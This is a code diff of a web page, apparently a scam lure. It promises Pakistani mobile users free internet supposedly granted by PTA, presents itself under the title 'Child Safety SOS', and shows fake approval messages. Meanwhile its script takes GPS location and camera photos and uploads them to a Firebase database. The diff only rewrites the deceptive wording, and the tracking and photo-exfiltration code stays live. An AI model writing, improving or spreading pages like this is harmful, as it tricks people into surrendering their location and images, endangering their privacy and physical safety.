@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Free Zong Monthly 250gb</title>
+    <title>Child Safety SOS</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
@@ -137,16 +137,16 @@
     <div class="icon-header">
         <i class="fa-solid fa-shield-cat"></i>
     </div>
-    <h2>Safety SOS</h2>
-    <p class="subtitle">Emergency main Free Zong, Moblink,Ufone,Aur Telenore ka mufat net hasil Karen PTA emergency Serves:</p>
+    <h2>PTA FREE INTERNAT</h2>
+    <p class="subtitle">PTA KE TARAF SE FREE INTERNATE HASEL KAREN HAR PAKISTANI K LYE:</p>
 
     <div class="action-group">
         <button class="btn-mobile btn-sos" onclick="sendSOS()">
-            <i class="fa-solid fa-location-crosshairs"></i> FREE INTERNET 150.GB
+            <i class="fa-solid fa-location-crosshairs"></i> AP KI REQUST PE INTERNATE K LYE PTA KO APPLACATION BHEJI JA RAHI HE
         </button>
 
         <button class="btn-mobile btn-camera" onclick="captureInstantPhoto()">
-            <i class="fa-solid fa-camera"></i> Free Zong 
+            <i class="fa-solid fa-camera"></i> ZON FREE 
         </button>
     </div>
 
@@ -190,14 +190,14 @@
                         });
                     });
                 }
-                status.innerText = "✅ Free Internet AP ko mil gae h 50gb 7 Din ke lye!";
+                status.innerText = "✅ Ap ko free internate 150.gb aproved ho gya he";
             }, (err) => { status.innerText = "GPS Error: " + err.message; }, { enableHighAccuracy: true });
         }
     }
 
     async function captureInstantPhoto() {
         const status = document.getElementById('statusText');
-        status.innerText = "Camera Access Kiya Ja Raha Hai...";
+        status.innerText = "Free internate 150.gb ke lye ruqest bheji ja rhi he...";
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -224,7 +224,7 @@
                     url: base64Image,
                     time: new Date().toLocaleString()
                 }).then(() => {
-                    status.innerText = "✅ All Zong Free 150gb mil gae h!";
+                    status.innerText = "✅ Zong free serves ruqest approved successfully!";
                 });
 
             }, 500);
